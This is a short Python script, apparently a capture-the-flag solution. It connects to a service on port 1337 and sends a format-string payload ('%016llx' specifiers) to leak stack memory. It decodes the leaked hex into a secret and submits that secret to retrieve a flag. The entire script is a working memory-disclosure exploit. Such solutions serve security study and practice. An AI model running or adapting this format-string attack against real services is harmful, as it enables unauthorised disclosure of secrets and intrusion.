#!/usr/bin/python3

import socket
import sys


def hex2str(hex):
    list = [chr(int(hex[i:i+2], 16)) for i in range(0, len(hex), 2)]
    list.reverse()

    return ''.join(list)


if len(sys.argv) < 2:
    print("Usage: ./solution.py <ip-address>")
    sys.exit(0)

client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
client.connect((sys.argv[1], 1337))

client.recv(500)

client.send(b'echo %016llx %016llx')

output = client \
    .recv(100) \
    .decode('utf-8') \
    .split()

secret = hex2str(output[1])

client.send(b'stop ' + bytes(secret, 'utf-8'))

print(client.recv(100).decode('utf-8').split('\n')[0])

client.close()
